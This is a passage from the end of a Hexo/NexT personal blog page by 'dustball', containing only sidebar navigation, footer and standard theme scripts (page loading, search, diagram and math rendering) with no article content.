class="nav-text">level7.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level8.0"><span class="nav-number">1.7.7.</span> <span class="nav-text">level8.0</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">36</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
